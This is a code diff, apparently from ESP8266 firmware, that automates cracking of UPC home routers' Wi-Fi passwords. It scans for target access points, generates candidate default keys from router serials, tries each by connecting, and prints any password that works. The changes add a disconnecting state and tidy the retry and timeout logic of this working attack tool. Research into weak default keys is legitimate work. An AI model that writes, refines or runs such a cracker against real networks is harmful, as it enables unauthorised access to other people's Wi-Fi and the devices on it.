@@ -24,6 +24,7 @@ enum {
     TARGETING,
     CRACKING,
     CONNECTING,
+    DISCONNECTING,
 } state;
 
 size_t ap_timeouts;
@@ -87,35 +88,34 @@ targets_found(void* arg, STATUS status){
 }
 
 char candidate_passwords[9][MAX_CANDIDATE_PASSWORDS];
-size_t current_password, passwords_found;
-
+size_t current_password;
 ICACHE_FLASH_ATTR
 static void test_passwords(os_event_t *events){
     size_t i;
     size_t ap_to_crack = (size_t) events->par;
 
-    if(state != CONNECTING){
+    if(state != CONNECTING && state != DISCONNECTING){
         os_printf("Error: not in connecting state\n");
         return;
     }
 
     if(ap_timeouts == MAX_TIMEOUTS){
         os_printf("AP not seen for %u seconds, aborting\n", MAX_TIMEOUTS/10);
-        current_password = passwords_found;
+        state = DISCONNECTING;
     }
 
-    if(current_password == passwords_found){
+    if(!candidate_passwords[current_password][0]){
         os_printf("Finished testing passwords\n");
         // done with testing, go back to scanning
+        state = DISCONNECTING;
+        memcpy(aps[ap_to_crack].password, "<UNKNOWN>", 9);
+    }
+
+    if(state == DISCONNECTING){
         wifi_station_disconnect();
         wifi_station_set_auto_connect(false);
-        if(!ap_timeouts && !aps[ap_to_crack].password[0]){
-            memcpy(aps[ap_to_crack].password, "<UNKNOWN>", 9);
-        }
         state = SCANNING;
-        if(ap_timeouts == MAX_TIMEOUTS){
-            ap_timeouts = 0;
-        }
+        ap_timeouts = 0;
         system_os_post(PRIO_SCAN, 0, 0 );
         return;
     }
@@ -149,8 +149,11 @@ static void test_passwords(os_event_t *events){
             os_delay_us(100000);
             break;
         case STATION_CONNECT_FAIL:
-            os_printf("Error connecting... retrying now\n");
             wifi_station_disconnect();
+            os_printf("Error connecting... retrying now\n");
+            ap_timeouts++;
+            // 100 ms
+            os_delay_us(100000);
             wifi_station_connect();
             break;
         case STATION_GOT_IP: {
@@ -163,7 +166,7 @@ static void test_passwords(os_event_t *events){
             memcpy(aps[ap_to_crack].password, candidate_passwords[current_password], 8);
             os_printf("Found valid password for %s: %s\n", aps[ap_to_crack].essid, aps[ap_to_crack].password);
             // no need to test more
-            current_password = passwords_found;
+            state = DISCONNECTING;
             break;
          }
     }
@@ -275,6 +278,7 @@ uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
 ICACHE_FLASH_ATTR
 static void crack(os_event_t *events){
     size_t ap_to_crack = (size_t) events->par;
+
     uint32_t buf[4];
     char serial[64];
     char pass[9], tmpstr[17];
@@ -287,8 +291,11 @@ static void crack(os_event_t *events){
         return;
     }
     if(aps[ap_to_crack].password[0]){
-        os_printf("Already cracked this AP (%s)\n", aps[ap_to_crack].essid);
-    } else if(aps[ap_to_crack].target){
+        os_printf("Error: Already cracked this AP (%s)\n", aps[ap_to_crack].essid);
+        return;
+    }
+
+    if(aps[ap_to_crack].target){
         memset(candidate_passwords, 0x0, sizeof(candidate_passwords));
 
         // breaks the rules by doing a lot of work all at once
@@ -341,7 +348,6 @@ static void crack(os_event_t *events){
         // switch to testing the passwords
         os_printf("Testing generated passwords\n");
         current_password = 0;
-        passwords_found = cnt-1;
         state = CONNECTING;
         system_os_post(PRIO_TEST, 0, (os_param_t) ap_to_crack);
     } else {
